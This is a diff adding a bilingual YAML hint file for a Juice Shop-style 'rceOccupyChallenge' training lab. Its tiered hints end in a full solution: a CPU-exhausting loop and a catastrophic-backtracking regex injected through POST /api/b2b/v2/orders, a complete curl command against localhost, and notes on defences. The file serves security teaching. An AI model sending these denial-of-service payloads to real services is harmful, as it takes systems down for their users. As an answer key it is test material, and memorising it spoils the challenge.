@@ -1,0 +1,90 @@
+challenge_key: "rceOccupyChallenge"
+schema_version: "juicelab.hints.v2"
+
+hints:
+  N1:
+    cost_pct: 5
+    text_fr: |
+      Hint OWASP : "occupy CPU 2 seconds". Tu connais le rceChallenge
+      (boucle infinie). Ici c'est une variante DoS : occuper le CPU > 2s
+      pour declencher le timeout sandbox.
+    text_en: |
+      OWASP hint: "occupy CPU 2 seconds". You know rceChallenge (infinite
+      loop). Here it's a DoS variant: occupy CPU > 2s to trigger sandbox
+      timeout.
+    pedagogical_intent: |
+      Activate timeout reflex.
+
+  N2:
+    cost_pct: 10
+    text_fr: |
+      Le sandbox notevil + vm.runInContext a 2 protections : (1) max
+      iterations (le rceChallenge), (2) timeout 2s (ce challenge). Il
+      faut un code qui PROGRESSE (avoid max iter) mais LENT (CPU bound).
+    text_en: |
+      notevil + vm.runInContext sandbox has 2 protections: (1) max
+      iterations (rceChallenge), (2) 2s timeout (this challenge). Need
+      code that PROGRESSES (avoid max iter) but SLOW (CPU bound).
+    pedagogical_intent: |
+      Spell distinction.
+
+  N3:
+    cost_pct: 20
+    text_fr: |
+      Exemple : un gros nested loop ou regex catastrophic backtracking.
+      `for(let i=0;i<1e9;i++){Math.sqrt(i);}` ou `'a'.repeat(100000).match
+      (/(a+)+b/)`. Le code fait du work mais lent.
+    text_en: |
+      Example: big nested loop or regex catastrophic backtracking.
+      `for(let i=0;i<1e9;i++){Math.sqrt(i);}` or `'a'.repeat(100000).match
+      (/(a+)+b/)`. Code does work but slow.
+    pedagogical_intent: |
+      Reveal CPU pattern.
+
+  N4:
+    cost_pct: 35
+    text_fr: |
+      Payload :
+      `{"orderLinesData": "for(let i=0;i<1e9;i++){Math.sqrt(i);}"}`
+      via POST /api/b2b/v2/orders. Le sandbox depasse 2000ms (timeout vm
+      option) et throw "Script execution timed out".
+    text_en: |
+      Payload:
+      `{"orderLinesData": "for(let i=0;i<1e9;i++){Math.sqrt(i);}"}` via
+      POST /api/b2b/v2/orders. Sandbox exceeds 2000ms (vm timeout option)
+      and throws "Script execution timed out".
+    pedagogical_intent: |
+      Spell working payload.
+
+  N5:
+    cost_pct: 50
+    text_fr: |
+      [KILL_CHAIN_DOCUMENTED] Workflow : (1) Login (Bearer token). (2) curl
+      POST :
+      `curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type:
+      application/json" -d '{"orderLinesData":"for(let
+      i=0;i<1e9;i++){Math.sqrt(i);}"}'
+      http://localhost:3000/api/b2b/v2/orders`. (3) Le serveur b2bOrder.
+      ts:23 `vm.runInContext(..., { timeout: 2000 })` execute mais depasse
+      2000ms. (4) vm throw `Error: Script execution timed out after 2000
+      ms`. (5) b2bOrder.ts:27
+      `if (getErrorMessage(err).match(/Script execution timed out.*/))`
+      match. (6) `solveIf(rceOccupyChallenge, () => true)` declenche.
+      Defense : isolated-vm + cpu_time_limit + per-tenant quotas + circuit
+      breaker. JAMAIS eval sur user input. Source : b2bOrder.ts:23-29.
+    text_en: |
+      [KILL_CHAIN_DOCUMENTED] Workflow: (1) Login (Bearer token). (2) curl
+      POST:
+      `curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type:
+      application/json" -d '{"orderLinesData":"for(let
+      i=0;i<1e9;i++){Math.sqrt(i);}"}'
+      http://localhost:3000/api/b2b/v2/orders`. (3) Server b2bOrder.ts:23
+      `vm.runInContext(..., { timeout: 2000 })` executes but exceeds
+      2000ms. (4) vm throws `Error: Script execution timed out after 2000
+      ms`. (5) b2bOrder.ts:27
+      `if (getErrorMessage(err).match(/Script execution timed out.*/))`
+      matches. (6) `solveIf(rceOccupyChallenge, () => true)` triggers.
+      Defense: isolated-vm + cpu_time_limit + per-tenant quotas + circuit
+      breaker. NEVER eval on user input. Source: b2bOrder.ts:23-29.
+    pedagogical_intent: |
+      Solution + canonical fix.
